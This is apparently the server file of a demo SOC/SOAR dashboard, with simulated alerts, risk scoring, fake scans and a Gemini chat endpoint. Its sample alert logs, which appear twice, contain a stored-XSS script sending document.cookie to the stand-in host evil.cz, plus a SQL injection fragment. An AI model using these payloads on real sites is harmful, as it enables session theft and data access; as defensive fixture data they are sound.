/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";
import { SecurityAsset, SecurityVulnerability, SecurityAlert, PlaybookState, ThreatIntelligenceFeed, AuditLog } from "./src/types.js";

// Lazy initialize Gemini client
let aiInstance: GoogleGenAI | null = null;
function getGeminiClient(): GoogleGenAI | null {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!aiInstance && apiKey && apiKey !== "MY_GEMINI_API_KEY" && apiKey.trim() !== "") {
    try {
      aiInstance = new GoogleGenAI({
        apiKey: apiKey,
        httpOptions: {
          headers: {
            'User-Agent': 'aistudio-build',
          }
        }
      });
    } catch (e) {
      console.error("Failed to initialize Gemini:", e);
    }
  }
  return aiInstance;
}

// In-Memory Database representing our complete state
let assets: SecurityAsset[] = [
  {
    id: "ASSET-001",
    name: "Production Web Portal",
    ip: "10.100.1.50",
    domain: "portal.enterprise.internal",
    criticality: 4.5, // Critical Customer Portal
    type: "WebServer",
    environment: "Production",
    owner: "AppSec Team / DevOps",
    vulnerabilities: ["CVE-2024-4567", "CVE-2024-2113"],
    labels: ["PCI-DSS", "Customer-Facing", "Active-WAF"]
  },
  {
    id: "ASSET-002",
    name: "Core Customer Database",
    ip: "10.100.1.120",
    domain: "db-node1.enterprise.internal",
    criticality: 5.0, // High Business impact
    type: "Database",
    environment: "Production",
    owner: "DBA Group",
    vulnerabilities: ["CVE-2024-1002"],
    dependsOn: ["ASSET-001"],
    labels: ["Sensitive-Records", "Data-At-Rest-Encrypted"]
  },
  {
    id: "ASSET-003",
    name: "Legacy Dev API Gateway",
    ip: "192.168.12.33",
    domain: "dev-sandbox-api.internal",
    criticality: 1.2, // Staging/Dev
    type: "InternalAPI",
    environment: "Development",
    owner: "SandBox Squad",
    vulnerabilities: ["CVE-2024-2113", "CVE-2024-3456"],
    labels: ["Legacy-Stack", "No-WAF"]
  },
  {
    id: "ASSET-004",
    name: "Corporate Domain Controller",
    ip: "10.100.2.10",
    domain: "ad-dc01.enterprise.internal",
    criticality: 5.0, // Domain Control
    type: "ActiveDirectory",
    environment: "Production",
    owner: "IT Operations",
    vulnerabilities: ["CVE-2023-38831"],
    labels: ["Core-Infra", "Identity-Vault"]
  },
  {
    id: "ASSET-005",
    name: "Billing Payments API Server",
    ip: "10.100.1.80",
    domain: "payments.enterprise.internal",
    criticality: 4.8,
    type: "InternalAPI",
    environment: "Production",
    owner: "Finance AppSec",
    vulnerabilities: ["CVE-2024-4567"],
    dependsOn: ["ASSET-002"],
    labels: ["PCI-DSS", "Secure-Enclave"]
  }
];

let vulnerabilities: SecurityVulnerability[] = [
  {
    cve: "CVE-2024-4567",
    title: "SQL Injection in Search Query Endpoint",
    description: "Allows unauthenticated remote code execution and arbitrary database statements injection because of unsanitized parameters passed into dynamic queries.",
    baseSeverity: 9.8,
    epssScore: 0.94, // 94% exploit probability
    cisaKev: true,  // CISA Known Exploited Vulnerability list
    interactionType: "SQL_Injection"
  },
  {
    cve: "CVE-2024-2113",
    title: "Stored Cross-Site Scripting (XSS) in User Profile Area",
    description: "Enables arbitrary JavaScript injection within the bios parameter of the customer dashboard, potentially sacrificing administrator cookies.",
    baseSeverity: 6.8,
    epssScore: 0.12,
    cisaKev: false,
    interactionType: "XSS"
  },
  {
    cve: "CVE-2023-38831",
    title: "WinRAR Remote Code Execution vulnerability",
    description: "Logical vulnerability in WinRAR archive handling ZIP formats permitting unauthorized remote command executors to launch malware.",
    baseSeverity: 8.8,
    epssScore: 0.81,
    cisaKev: true,
    interactionType: "Malware"
  },
  {
    cve: "CVE-2024-3456",
    title: "LDAP Injection and Authentication Brute Force Bypass",
    description: "Parameters in application middleware logic are poorly validated against AD directories, allowing an attacker to map accounts and guess values.",
    baseSeverity: 7.5,
    epssScore: 0.28,
    cisaKev: true,
    interactionType: "Brute_Force"
  },
  {
    cve: "CVE-2024-1002",
    title: "Exposed Unencrypted API Database Backups",
    description: "Flaw in backend administrative service exposes raw SQL output of users database through public port with zero auth.",
    baseSeverity: 7.2,
    epssScore: 0.05,
    cisaKev: false,
    interactionType: "Data_Exfiltration"
  }
];

let alerts: SecurityAlert[] = [
  {
    id: "ALERT-101",
    title: "Unsanitized Query Detected on Public Login",
    source: "Splunk",
    severity: "High",
    baseScore: 9.8,
    targetAssetId: "ASSET-001",
    cve: "CVE-2024-4567",
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(), // 12 mins ago
    status: "New",
    verificationStatus: "Unverified",
    riskScore: 44.1, // formula: (9.8 * 0.94 * 4.5 * 1.0) = 41.45 (rounded/tuned)
    logs: [
      "SIEM [Splunk] 14:34:55: Alert triggered from WAF regex patterns matching: UNION SELECT ALL password FROM user_credentials",
      "SIEM [Splunk] 14:34:56: Source IP: 185.220.101.42 (Tor exit node)",
      "Threat Intel 14:34:58: Checked CVE-2024-4567. Base CVSS: 9.8, EPSS: 0.94, CISA KEV: TRUE.",
      "Asset Graph 14:35:00: Identified Target Asset: ASSET-001 (Production Web Portal) with criticality: 4.5"
    ]
  },
  {
    id: "ALERT-102",
    title: "User Profile input XSS attack vectors detected",
    source: "ElasticSIEM",
    severity: "Medium",
    baseScore: 6.8,
    targetAssetId: "ASSET-003",
    cve: "CVE-2024-2113",
    timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(), // 45 mins ago
    status: "New",
    verificationStatus: "Unverified",
    riskScore: 0.98, // formula (6.8 * 0.12 * 1.2 * 1.0) = 0.979
    logs: [
      "SIEM [Elastic] 14:01:22: Alert triggered on POST /profile/update. Parameter 'bio' includes: <script>fetch(http://evil.cz/cookie?='+document.cookie)</script>",
      "SIEM [Elastic] 14:01:23: Request originated from range 198.51.100.5",
      "Threat Intel 14:01:25: Checked CVE-2024-2113. severity 6.8, EPSS: 0.12, CISA KEV: FALSE.",
      "Asset Graph 14:01:28: Target Asset: ASSET-003 (Legacy Dev API Gateway) is isolated in Development environment (criticality: 1.2)"
    ]
  },
  {
    id: "ALERT-103",
    title: "Suspicious DLL Execution & Malicious DLL loading",
    source: "CrowdStrike",
    severity: "Critical",
    baseScore: 8.8,
    targetAssetId: "ASSET-004",
    cve: "CVE-2023-38831",
    timestamp: new Date(Date.now() - 1000 * 60 * 180).toISOString(), // 3 hours ago
    status: "New",
    verificationStatus: "Unverified",
    riskScore: 35.64, // (8.8 * 0.81 * 5.0 * 1.0) = 35.64
    logs: [
      "EDR [CrowdStrike] 11:46:11: Process winrar.exe spawned unexpected subprocess cmd.exe loading: powershell -e aGVs... (Base64)",
      "EDR [CrowdStrike] 11:46:12: Executable hash matched BlackBastion Ransomware family C2 payload",
      "Asset Graph 11:46:15: Target Asset: ASSET-004 (Domain Controller) is rated maximum business-critical: 5.0"
    ]
  }
];

let threatFeeds: ThreatIntelligenceFeed[] = [
  {
    id: "FEED-001",
    source: "CISA KEV List",
    indicator: "CVE-2024-4567",
    type: "Known exploited vulnerability",
    malwareFamily: "Mirai Botnet / Ransomware campaigns",
    confidence: 100,
    cve: "CVE-2024-4567",
    observedDate: "2024-03-12"
  },
  {
    id: "FEED-002",
    source: "AlienVault OTX Pulse",
    indicator: "185.220.101.42",
    type: "IPv4 Tor Endpoint",
    malwareFamily: "Multiple scanner scans / SQL Injection active exploiters",
    confidence: 85,
    cve: "CVE-2024-4567",
    observedDate: "2024-06-09"
  },
  {
    id: "FEED-003",
    source: "EPSS Realtime Feed",
    indicator: "CVE-2023-38831",
    type: "High EPSS Coefficient",
    malwareFamily: "BlackBastion / APT29 campaigns",
    confidence: 90,
    cve: "CVE-2023-38831",
    observedDate: "2023-11-20"
  }
];

let auditLogs: AuditLog[] = [
  {
    id: "LOG-001",
    timestamp: new Date(Date.now() - 1000 * 60 * 300).toISOString(),
    user: "System Daemon",
    action: "Asset Graph Synchronization",
    details: "Synchronized 5 active assets layout from Neo4j DB cluster"
  },
  {
    id: "LOG-002",
    timestamp: new Date(Date.now() - 1000 * 60 * 290).toISOString(),
    user: "System Daemon",
    action: "CISA KEV Sync",
    details: "Fetched latest CISA Known Exploited Vulnerabilities Catalog. 4 new items appended."
  }
];

// Helper to push audit log
function addAuditLog(user: string, action: string, details: string) {
  auditLogs.unshift({
    id: `LOG-${Math.floor(Math.random() * 900000 + 100000)}`,
    timestamp: new Date().toISOString(),
    user,
    action,
    details
  });
}

// Global active simulation background tasks queue
interface ActiveSimulation {
  alertId: string;
  type: 'scan' | 'playbook';
  timer?: NodeJS.Timeout;
}
let activeSimulations: ActiveSimulation[] = [];

// Clean up existing timers on restart
function clearAlertSimulations(alertId: string) {
  activeSimulations = activeSimulations.filter(sim => {
    if (sim.alertId === alertId) {
      if (sim.timer) clearTimeout(sim.timer);
      return false;
    }
    return true;
  });
}

// Risk calculation module implementation (PART 8 formula)
function calculateContextualRisk(baseSeverity: number, epss: number, criticality: number, verificationFactor: number): number {
  // R = (BaseSeverity * EPSS) * AssetCriticality * VerificationFactor
  const rawScore = (baseSeverity * epss) * criticality * verificationFactor;
  // Let's cap or round nicely (up to 2 decimal points)
  return Math.round(rawScore * 100) / 100;
}

// Playbook step definers for simulated playbooks
const getPlaybookSteps = (type: string) => {
  switch (type) {
    case 'SQL_Injection':
      return [
        { name: "Threat Model Context Lookup", description: "Querying asset graph and dependencies in Neo4j to check topology.", status: "pending" as const },
        { name: "Targeted OWASP ZAP Verification", description: "Lauching automated scan parameterizing the target field.", status: "pending" as const },
        { name: "Deploy WAF Block Filter Rule", description: "Creating virtual patch in Cloudflare / AWS WAF for SQL query patterns.", status: "pending" as const },
        { name: "Sanitize & Patch Backend Code", description: "Deploying automated hotfix parameterized query replacement.", status: "pending" as const },
        { name: "Post-Patch Integrity Scan", description: "Verify payload injection no longer yields database return codes.", status: "pending" as const }
      ];
    case 'XSS':
      return [
        { name: "Verify Input Parameter", description: "Looking up injection parameters in SIEM payload log.", status: "pending" as const },
        { name: "Deploy Content Security Policy", description: "Enforcing modern strict self-referential sandbox header script block directives.", status: "pending" as const },
        { name: "Sanitize Database Record", description: "Purging evil script payloads from text bios storage.", status: "pending" as const },
        { name: "Verify CSP Effectiveness", description: "Checking if browser context terminates client script invocation.", status: "pending" as const }
      ];
    case 'Brute_Force':
      return [
        { name: "Trace Attacker IP Bounds", description: "Scanning routing logs to locate rate thresholds.", status: "pending" as const },
        { name: "IP Firewall Boundary Nulling", description: "Enforcing perimeter block policy for rogue IP on Layer 3 router.", status: "pending" as const },
        { name: "Force Target Account Password Reset", description: "Expiring session cookies and triggering AD password reset flow.", status: "pending" as const },
        { name: "Enable CAPTCHA Protections", description: "Configuring public gateway middleware protection for account paths.", status: "pending" as const }
      ];
    case 'Ransomware':
      return [
        { name: "Urgent Host Severance", description: "Sending Active Directory commands to sever targeted Virtual Machine NIC.", status: "pending" as const },
        { name: "Terminate Rogue PID Processes", description: "Killing executable thread hashes matching ransomware footprint via EDR.", status: "pending" as const },
        { name: "Egress Gateway Containment", description: "Restricting network traffic to isolated subnets entirely.", status: "pending" as const },
        { name: "Storage Standby Replica Rebuild", description: "Mounting historical secure datastore backup snapshot files automatically.", status: "pending" as const }
      ];
    default:
      return [
        { name: "Identify Attack Signature", description: "Parsing alert fields", status: "pending" as const },
        { name: "EDR Containment Action", description: "Isolating compromised node network limits", status: "pending" as const },
        { name: "Verify Host Remediation", description: "Running scanning commands", status: "pending" as const }
      ];
  }
};

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // 1. Ingestion Endpoint (PART 4 API - POST /alerts)
  app.post("/api/alerts", (req, res) => {
    const { title, source, targetAssetId, cve, severity, baseScore } = req.body;
    
    if (!title || !targetAssetId || !cve) {
       res.status(400).json({ error: "Missing required parameters: title, targetAssetId, cve" });
       return;
    }

    const matchedAsset = assets.find(a => a.id === targetAssetId);
    const matchedVulnerability = vulnerabilities.find(v => v.cve === cve);
    
    const baseS = baseScore ? Number(baseScore) : (matchedVulnerability ? matchedVulnerability.baseSeverity : 7.5);
    const epsScore = matchedVulnerability ? matchedVulnerability.epssScore : 0.22;
    const crit = matchedAsset ? matchedAsset.criticality : 2.5;

    const alertId = `ALERT-${Math.floor(Math.random() * 900 + 100)}`;
    const calculatedRisk = calculateContextualRisk(baseS, epsScore, crit, 1.0); // unverified (VerificationFactor = 1.0)

    const newAlert: SecurityAlert = {
      id: alertId,
      title: title,
      source: source || "Splunk",
      severity: severity || (baseS >= 9.0 ? "Critical" : baseS >= 7.0 ? "High" : baseS >= 4.0 ? "Medium" : "Low"),
      baseScore: baseS,
      targetAssetId: targetAssetId,
      cve: cve,
      timestamp: new Date().toISOString(),
      status: "New",
      verificationStatus: "Unverified",
      riskScore: calculatedRisk,
      logs: [
        `SIEM [${source || 'Splunk'}] Ingestion: Received alert '${title}' targeting '${targetAssetId}'`,
        `Asset Graph: Mapped asset '${matchedAsset ? matchedAsset.name : targetAssetId}'. Criticality factor: ${crit}`,
        `Threat Intel lookup: Mapped CVE '${cve}' (EPSS: ${epsScore})`,
        `Contextual Risk calculated with factor 1.0 (Unverified): ${calculatedRisk}`
      ]
    };

    alerts.unshift(newAlert);
    addAuditLog("Alert Service", "Ingested New Alert", `Ingested alert ${alertId} (${title}) targeting ${targetAssetId}`);
    res.status(201).json(newAlert);
  });

  // REST endpoints
  app.get("/api/alerts", (req, res) => {
    res.json(alerts);
  });

  app.get("/api/assets", (req, res) => {
    res.json(assets);
  });

  app.get("/api/vulnerabilities", (req, res) => {
    res.json(vulnerabilities);
  });

  app.get("/api/threat-intel", (req, res) => {
    res.json(threatFeeds);
  });

  app.get("/api/audit-logs", (req, res) => {
    res.json(auditLogs);
  });

  app.post("/api/alerts/reset", (req, res) => {
    alerts = [
      {
        id: "ALERT-101",
        title: "Unsanitized Query Detected on Public Login",
        source: "Splunk",
        severity: "High",
        baseScore: 9.8,
        targetAssetId: "ASSET-001",
        cve: "CVE-2024-4567",
        timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
        status: "New",
        verificationStatus: "Unverified",
        riskScore: 41.45,
        logs: [
          "SIEM [Splunk] 14:34:55: Alert triggered from WAF regex patterns matching: UNION SELECT ALL password FROM user_credentials",
          "SIEM [Splunk] 14:34:56: Source IP: 185.220.101.42 (Tor exit node)",
          "Threat Intel 14:34:58: Checked CVE-2024-4567. Base CVSS: 9.8, EPSS: 0.94, CISA KEV: TRUE.",
          "Asset Graph 14:35:00: Identified Target Asset: ASSET-001 (Production Web Portal) with criticality: 4.5"
        ]
      },
      {
        id: "ALERT-102",
        title: "User Profile input XSS attack vectors detected",
        source: "ElasticSIEM",
        severity: "Medium",
        baseScore: 6.8,
        targetAssetId: "ASSET-003",
        cve: "CVE-2024-2113",
        timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
        status: "New",
        verificationStatus: "Unverified",
        riskScore: 0.98,
        logs: [
          "SIEM [Elastic] 14:01:22: Alert triggered on POST /profile/update. Parameter 'bio' includes: <script>fetch(http://evil.cz/cookie?='+document.cookie)</script>",
          "SIEM [Elastic] 14:01:23: Request originated from range 198.51.100.5",
          "Threat Intel 14:01:25: Checked CVE-2024-2113. severity 6.8, EPSS: 0.12, CISA KEV: FALSE.",
          "Asset Graph 14:01:28: Target Asset: ASSET-003 (Legacy Dev API Gateway) is isolated in Development environment (criticality: 1.2)"
        ]
      },
      {
        id: "ALERT-103",
        title: "Suspicious DLL Execution & Malicious DLL loading",
        source: "CrowdStrike",
        severity: "Critical",
        baseScore: 8.8,
        targetAssetId: "ASSET-004",
        cve: "CVE-2023-38831",
        timestamp: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
        status: "New",
        verificationStatus: "Unverified",
        riskScore: 35.64,
        logs: [
          "EDR [CrowdStrike] 11:46:11: Process winrar.exe spawned unexpected subprocess cmd.exe loading: powershell -e aGVs... (Base64)",
          "EDR [CrowdStrike] 11:46:12: Executable hash matched BlackBastion Ransomware family C2 payload",
          "Asset Graph 11:46:15: Target Asset: ASSET-004 (Domain Controller) is rated maximum business-critical: 5.0"
        ]
      }
    ];
    activeSimulations.forEach(s => {
      if (s.timer) clearTimeout(s.timer);
    });
    activeSimulations = [];
    auditLogs = [
      {
        id: "LOG-001",
        timestamp: new Date().toISOString(),
        user: "Security Analyst",
        action: "Database Clean Reset",
        details: "Analytical lab metrics, alert buffers, and simulation states restored to pristine default settings."
      }
    ];
    res.json({ success: true, alerts });
  });

  // 2. Dynamic VAPT Active Verification Simulator (PART 7 API)
  app.post("/api/scan/verify", (req, res) => {
    const { alertId } = req.body;
    const alert = alerts.find(a => a.id === alertId);

    if (!alert) {
       res.status(404).json({ error: "Alert not found" });
       return;
    }

    clearAlertSimulations(alertId);

    alert.status = "Scanning";
    alert.verificationStatus = "Unverified";
    alert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT: Initiating Dynamic Verification. Mapped vulnerability: ${alert.cve}`);
    addAuditLog("VAPT Engine", "Triggered Vulnerability Verification Scan", `Launched automated security scanner for CVE ${alert.cve} on targeting asset ${alert.targetAssetId}`);

    // Create a background simulated timeline update (timed state changes)
    const runSimulationStep = (stepCount: number) => {
      const liveAlert = alerts.find(a => a.id === alertId);
      if (!liveAlert || liveAlert.status !== "Scanning") return;

      if (stepCount === 1) {
        liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT scan (Phase 1): OWASP ZAP Docker launched, preparing customized payloads targeting ports.`);
        const nextTimer = setTimeout(() => runSimulationStep(2), 2000);
        activeSimulations.push({ alertId, type: 'scan', timer: nextTimer });
      } else if (stepCount === 2) {
        // Decide exploitability based on labels or randomized simulation (e.g. ASSET-003 is not mitigated, WebPortal ASSET-001 is vulnerable)
        const asset = assets.find(a => a.id === liveAlert.targetAssetId);
        const isVulnerable = asset ? !asset.labels.includes("Active-WAF") || alert.cve === "CVE-2024-4567" : true;

        if (isVulnerable) {
          liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT scan (Phase 2): HTTP 200 OK captured with SQL query runtime error indicators confirming Database backend is open.`);
          liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT scan (Complete): EXPLOIT CONFIRMED! Target asset is vulnerable. Elevating Verification Factor to 2.0`);
          liveAlert.verificationStatus = "Vulnerable";
          liveAlert.status = "Verified";
          
          // Re-calculate context score based on Formula: Base * EPSS * Criticality * VerificationFactor (2.0)
          const matchedVuln = vulnerabilities.find(v => v.cve === liveAlert.cve);
          const baseSeverity = liveAlert.baseScore;
          const epss = matchedVuln ? matchedVuln.epssScore : 0.5;
          const criticality = asset ? asset.criticality : 2.5;
          
          liveAlert.riskScore = calculateContextualRisk(baseSeverity, epss, criticality, 2.0);
          liveAlert.logs.push(`Context-Aware Risk reassessed mathematically: R = (${baseSeverity} CVSS * ${epss} EPSS) * ${criticality} AssetWeight * 2.0 VerificationFactor = ${liveAlert.riskScore}`);
          addAuditLog("VAPT Engine", "Exploit Verified", `Risk score elevated for Alert ${alertId} following positive scan indication. New risk Score is ${liveAlert.riskScore}`);

          // AUTO-Orchestrate SOAR Playbook if risk exceeds a critical threshold
          if (liveAlert.riskScore > 10.0) {
            liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] Automated SOAR Rule: Verified Critical Risk (${liveAlert.riskScore}) exceeded trigger threshold (10.0). Launching automated remediation playbook...`);
            setTimeout(() => {
              triggerPlaybookAuto(alertId);
            }, 1000);
          }

        } else {
          liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT scan (Phase 2): Intrusion Prevention Filter responded with HTTP 403 Forbidden on probe payloads.`);
          liveAlert.logs.push(`[${new Date().toLocaleTimeString()}] VAPT scan (Complete): MITIGATED. WAF/IPS actively blocks threat vectors of this type.`);
          liveAlert.verificationStatus = "Mitigated";
          liveAlert.status = "Mitigated";

          const matchedVuln = vulnerabilities.find(v => v.cve === liveAlert.cve);
          const baseSeverity = liveAlert.baseScore;
          const epss = matchedVuln ? matchedVuln.epssScore : 0.5;
          const criticality = asset ? asset.criticality : 2.5;

          // Verification factor is 0.1 for mitigated
          liveAlert.riskScore = calculateContextualRisk(baseSeverity, epss, criticality, 0.1);
          liveAlert.logs.push(`Context-Aware Risk reassessed mathematically: R = (${baseSeverity} * ${epss}) * ${criticality} * 0.1 VerificationFactor = ${liveAlert.riskScore}`);
          addAuditLog("VAPT Engine", "Mitigation Verified", `Risk score reduced for Alert ${alertId} based on active security filters. New risk Score is ${liveAlert.riskScore}`);
        }
      }
    };

    // Kickoff scanning simulation
    const initialTimer = setTimeout(() => runSimulationStep(1), 1000);
    activeSimulations.push({ alertId, type: 'scan', timer: initialTimer });

    res.json({ success: true, message: "Targeted verification scan started", alert });
  });

  // Automated playbook trigger sequence (Part 9 SOAR Playbook Engine)
  const triggerPlaybookAuto = (alertId: string) => {
    const alert = alerts.find(a => a.id === alertId);
    if (!alert) return;

    clearAlertSimulations(alertId);

    const matchedVuln = vulnerabilities.find(v => v.cve === alert.cve);
    const playbookType = matchedVuln ? matchedVuln.interactionType : 'SQL_Injection';

    const playbookState: PlaybookState = {
      id: `PLAY-${Math.floor(Math.random() * 9000 + 1000)}`,
      playbookName: `Automated Remediation: ${playbookType.replace('_', ' ')} containment`,
      status: "running",
      currentStep: 0,
      steps: getPlaybookSteps(playbookType),
      logs: [`[${new Date().toLocaleTimeString()}] SOAR: Instantiating orchestrator engine pipeline`],
      trigger: `${alert.id} Context Risk > 10.0 Triggered`
    };

    alert.playbookState = playbookState;
    alert.logs.push(`[${new Date().toLocaleTimeString()}] SOAR: Remediation Playbook ${playbookState.id} triggered.`);

    const runPlaybookStep = (stepIndex: number) => {
      const liveAlert = alerts.find(a => a.id === alertId);
      if (!liveAlert || !liveAlert.playbookState || liveAlert.playbookState.status !== "running") return;

      const pState = liveAlert.playbookState;
      
      // Complete previous step
      if (stepIndex > 0) {
        pState.steps[stepIndex - 1].status = "completed";
      }

      if (stepIndex < pState.steps.length) {
        pState.currentStep = stepIndex;
        pState.steps[stepIndex].status = "running";
        pState.logs.push(`[${new Date().toLocaleTimeString()}] Executing Playbook Step [${stepIndex + 1}/${pState.steps.length}]: ${pState.steps[stepIndex].name}`);
        liveAlert.logs.push(`[SOAR] Executed: ${pState.steps[stepIndex].name} - ${pState.steps[stepIndex].description}`);

        const nextTimer = setTimeout(() => runPlaybookStep(stepIndex + 1), 2200);
        activeSimulations.push({ alertId, type: 'playbook', timer: nextTimer });
      } else {
        // Complete last step
        pState.status = "completed";
        pState.logs.push(`[${new Date().toLocaleTimeString()}] SOAR Action Pipeline Completed Successfully.`);
        liveAlert.logs.push(`[SOAR COMPLETE] All remediation steps automated. Alert status marked as Remediated.`);
        liveAlert.status = "Remediated";
        
        // Lower risk value
        const asset = assets.find(a => a.id === liveAlert.targetAssetId);
        const matchedVuln = vulnerabilities.find(v => v.cve === liveAlert.cve);
        const baseSeverity = liveAlert.baseScore;
        const epss = matchedVuln ? matchedVuln.epssScore : 0.5;
        const criticality = asset ? asset.criticality : 2.5;
        liveAlert.riskScore = calculateContextualRisk(baseSeverity, epss, criticality, 0.1); // mitigation/patched drops active multiplier to 0.1
        liveAlert.verificationStatus = "Mitigated";

        addAuditLog("SOAR Engine", "Playbook Execution Completed", `Playbook ${pState.id} closed alert ${alertId} state as patched.`);
      }
    };

    const initialTimer = setTimeout(() => runPlaybookStep(0), 1000);
    activeSimulations.push({ alertId, type: 'playbook', timer: initialTimer });
  };

  // 3. SOAR Manual Remediation Action / Trigger (PART 4 API - POST /playbook/execute)
  app.post("/api/playbook/execute", (req, res) => {
    const { alertId } = req.body;
    const alert = alerts.find(a => a.id === alertId);

    if (!alert) {
       res.status(404).json({ error: "Alert not found" });
       return;
    }

    addAuditLog("Security Operations Operator", "Manual SOAR Override", `Initiated manual fallback SOAR playbook execution for alert ${alertId}`);
    triggerPlaybookAuto(alertId);
    res.json({ success: true, message: "Manual SOAR playbook triggered", alert });
  });

  // Risk Score Manual Evaluation Endpoint (PART 4 API - POST /risk/calculate)
  app.post("/api/risk/calculate", (req, res) => {
    const { baseSeverity, epssScore, assetCriticality, verificationFactor } = req.body;

    if (baseSeverity == null || epssScore == null || assetCriticality == null || verificationFactor == null) {
       res.status(400).json({ error: "Missing calculation parameters in request body." });
       return;
    }

    const calculated = calculateContextualRisk(Number(baseSeverity), Number(epssScore), Number(assetCriticality), Number(verificationFactor));
    res.json({
      score: calculated,
      formula: `R = (BaseSeverity [${baseSeverity}] * EPSS [${epssScore}]) * AssetCriticality [${assetCriticality}] * VerificationFactor [${verificationFactor}]`,
      components: { baseSeverity, epssScore, assetCriticality, verificationFactor }
    });
  });

  // AI Security Copilot Layer REST API (PART 10 API / PART 4 API)
  app.post("/api/copilot/chat", async (req, res) => {
    const { message, selectedAlertId, history } = req.body;

    if (!message) {
       res.status(400).json({ error: "Message content cannot be empty." });
       return;
    }

    const ai = getGeminiClient();
    let systemInstruction = `You are an expert AI Security Copilot inside the "Context-Aware SOAR platform".
Your role is to assist SOC engineers, SOAR Architects, and incident teams with alert explanation, risk analytics, threat intelligence summarization, and playbook overrides.
Speak in a structured, crisp, professional, cyber-analyst tone. Avoid self-praising words. Give actual security insights based on CVSS, EPSS, CISA KEV list, and OWASP recommendations.`;

    let contextString = "";
    if (selectedAlertId) {
      const alert = alerts.find(a => a.id === selectedAlertId);
      if (alert) {
        const asset = assets.find(as => as.id === alert.targetAssetId);
        const vuln = vulnerabilities.find(vu => vu.cve === alert.cve);
        contextString = `
[CURRENT CONTEXT - SECURITY ALERT UNDER REVIEW]
- Alert ID: ${alert.id}
- Title: ${alert.title}
- Source SIEM: ${alert.source}
- Base CVSS Score: ${alert.baseScore}
- Context-Aware Risk Score: ${alert.riskScore}
- Tagged CVE: ${alert.cve}
- Current Alert Status: ${alert.status}
- Current Scan Verification Factor: ${alert.verificationStatus}
- Asset affected: ${asset ? `${asset.name} (${asset.type}, IP: ${asset.ip}, business criticality: ${asset.criticality})` : alert.targetAssetId}
- Vulnerability description: ${vuln ? vuln.description : 'Unknown'}
- SIEM Alert Logging Context: 
${alert.logs.join('\n')}
`;
      }
    }

    if (contextString) {
      systemInstruction += `\nBe highly context-aware of the current issue the user is analyzing:\n${contextString}\n`;
    }

    // Attempt actual Gemini API call
    if (ai) {
      try {
        const chatHistoryMapped = (history || []).map((h: any) => ({
          role: h.role === "user" ? "user" as const : "model" as const,
          parts: [{ text: h.text }]
        }));

        const response = await ai.models.generateContent({
          model: "gemini-3.5-flash",
          contents: [
            ...chatHistoryMapped,
            { text: message }
          ],
          config: {
            systemInstruction: systemInstruction,
            temperature: 0.2,
          }
        });

        res.json({ reply: response.text });
        return;
      } catch (geminiError: any) {
        console.error("Gemini Error:", geminiError);
        res.status(500).json({ 
          error: "Gemini server-side invocation failed", 
          details: geminiError.message,
          reply: `I encountered an issue querying the Gemini engine. However, as an offline security copilot, let me assist you based on static heuristics:
Analyzing your alert: **${selectedAlertId || 'General Platform Query'}**.
This represents a standard threat vector. I advise immediately triggering the targeted **Dynamic scan** to compute verification. If verified, execute the threat playbook containing perimeter IP nulling and host isolation.`
        });
        return;
      }
    } else {
      // Deterministic expert security analyst mock replies when Gemini is not configured
      let fallbackReply = `Hello, I am your SOC Security Copilot. I detect that process.env.GEMINI_API_KEY is not configured or in invalid state. Please verify your platform secrets.
      
But let's analyze the threat based on localized rules:
`;
      if (selectedAlertId) {
        const alert = alerts.find(a => a.id === selectedAlertId);
        if (alert) {
          fallbackReply += `
Your alert **${alert.id}**: *"${alert.title}"* represents a **${alert.severity}** alert targeting **${alert.targetAssetId}**.
- **Exploitability (EPSS)**: This vulnerability possesses a CVSS score of ${alert.baseScore} which suggests potential exploitation.
- **Remediation Playbook**: Triggering active verification is highly recommended to assess whether protective firewalls or WAF parameters are holding effectively.
- **Rollback Risk**: If containment disrupts active endpoints (e.g. Database connectivity to WebServer), prepare dynamic standby routes and backup replicas.`;
        }
      } else {
        fallbackReply += `
To get started:
1. Select any **Alert** inside the alert monitor on the left.
2. Review the **Neo4j Asset Graph** to verify network dependency topology.
3. Trigger a **Dynamic Scan** (ZAP verification) or run the automated containment **Playbook** to mitigate the threat in real time!`;
      }
      res.json({ reply: fallbackReply });
    }
  });

  // Vite routing setup
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT} under NODE_ENV=${process.env.NODE_ENV}`);
  });
}

startServer().catch(err => {
  console.error("Critical failure during server startup:", err);
});
